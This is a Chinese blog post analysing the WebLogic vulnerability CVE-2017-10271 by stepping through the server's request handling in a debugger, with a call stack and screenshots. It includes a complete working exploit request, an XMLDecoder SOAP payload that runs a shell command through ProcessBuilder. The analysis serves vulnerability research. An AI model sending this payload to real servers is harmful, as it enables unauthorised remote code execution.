# IDEA debug 漏洞第一篇(weblogic,cve-2017-10271) - ph4nt0mer - 博客园

> 原文：[`www.cnblogs.com/ph4nt0mer/p/11775908.html`](https://www.cnblogs.com/ph4nt0mer/p/11775908.html)

在 weblogic.wsee.jaxws.WLSServletAdapter 的 129 行打点

```
1 if (var2.getMethod().equals("GET") || var2.getMethod().equals("HEAD")) {
```

然后开启 debug 模式，进行发包，截获断点处的请求包。

burp 包内容：

```
POST /wls-wsat/CoordinatorPortType11 HTTP/1.1
Host: localhost:7001
Content-Type: text/xml
Content-Length: 987 <?xml version="1.0"?>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
    <soapenv:Header>
        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
            <java version="1.8.0_131" class="java.beans.XMLDecoder">
                <void class="java.lang.ProcessBuilder">
                    <array class="java.lang.String" length="3">
                        <void index="0">
                            <string>/bin/bash</string>
                        </void>
                        <void index="1">
                            <string>-c</string>
                        </void>
                        <void index="2">
                            <string>id</string>
                        </void>
                    </array>
                    <void method="start" />
                </void>
            </java>
        </work:WorkContext>
    </soapenv:Header>
    <soapenv:Body />
</soapenv:Envelope>
```

调用链（从下往上）

 ![](img/e34f2157482ec822c8c22cc967e1ba41.png)

processRequest:43, WorkContextServerTube (weblogic.wsee.jaxws.workcontext)
__doRun:866, Fiber (com.sun.xml.ws.api.pipe)
_doRun:815, Fiber (com.sun.xml.ws.api.pipe)
doRun:778, Fiber (com.sun.xml.ws.api.pipe)
runSync:680, Fiber (com.sun.xml.ws.api.pipe)
process:403, WSEndpointImpl$2 (com.sun.xml.ws.server)
handle:539, HttpAdapter$HttpToolkit (com.sun.xml.ws.transport.http)
handle:253, HttpAdapter (com.sun.xml.ws.transport.http)
handle:140, ServletAdapter (com.sun.xml.ws.transport.http.servlet)
handle:171, WLSServletAdapter (weblogic.wsee.jaxws)
run:708, HttpServletAdapter$AuthorizedInvoke (weblogic.wsee.jaxws)
doAs:363, AuthenticatedSubject (weblogic.security.acl.internal)
runAs:146, SecurityManager (weblogic.security.service)
authenticatedInvoke:103, ServerSecurityHelper (weblogic.wsee.util)
run:311, HttpServletAdapter$3 (weblogic.wsee.jaxws)
post:336, HttpServletAdapter (weblogic.wsee.jaxws)
doRequest:99, JAXWSServlet (weblogic.wsee.jaxws)
service:99, AbstractAsyncServlet (weblogic.servlet.http)
service:820, HttpServlet (javax.servlet.http)
run:227, StubSecurityHelper$ServletServiceAction (weblogic.servlet.internal)
invokeServlet:125, StubSecurityHelper (weblogic.servlet.internal)
execute:301, ServletStubImpl (weblogic.servlet.internal)
execute:184, ServletStubImpl (weblogic.servlet.internal)
wrapRun:3732, WebAppServletContext$ServletInvocationAction (weblogic.servlet.internal)
run:3696, WebAppServletContext$ServletInvocationAction (weblogic.servlet.internal)
doAs:321, AuthenticatedSubject (weblogic.security.acl.internal)
runAs:120, SecurityManager (weblogic.security.service)
securedExecute:2273, WebAppServletContext (weblogic.servlet.internal)
execute:2179, WebAppServletContext (weblogic.servlet.internal)
run:1490, ServletRequestImpl (weblogic.servlet.internal)
execute:256, ExecuteThread (weblogic.work)
run:221, ExecuteThread (weblogic.work)

 断点 weblogic.wsee.jaxws.WLSServletAdapter 的 129 行

![](img/a8c403612d860d1eeb1a5d1f72f143cf.png)

 然后进行下一步调试

因为我们是 post 请求，这个条件明显可以 F8 跳过。没必要跟入。

来到 super.handle(var1, var2, var3);

步入

匹配 text/xml 后才 return  true

![](img/ed9eb3c001fbd7055da6f64452d490c6.png)

然后会在 com.sun.xml.ws.api.pipe.Fiber 进入一个 for 循环

for 循环之中主要是 this.next 的值在变动。

 ![](img/c01afbb2db503cab71ad66e09a862b7a.png)

一直循环到 this.next 的值为 WorkContextServerTube，才是真正触发的类。

![](img/7cbd8c365d9cfc8e58ca8e640df1b20a.png)

最后到

readHeaderOld 函数 ![](img/45a501bf47c91fad3732636f6bb1b5fc.png)

才是步入正题。

看看 var1

 是我们的 post 内容

![](img/1b956228dfef7589f045a774b640ecd1.png)

 跟进 this.readHeaderOld(var3);

查看 var4，var4 已经被赋值上 post 真正执行的代码部分，也就是 java 标签开始到结束。

![](img/7819c4affb141715b9c46fa9344b82cb.png)

 将 java 代码实例化 WorkContextXmlInputAdapter 类。

var4.toByteArray()这处也可以让我们知道为啥 2725 里面可以用字节类型生成 poc。

*真正的底层触发点*

```
**![](img/b117f866d92e520344392656de0e18ee.png)**
```

完全没有过滤。所以执行了 rce。到此，10271 简单的分析就结束了。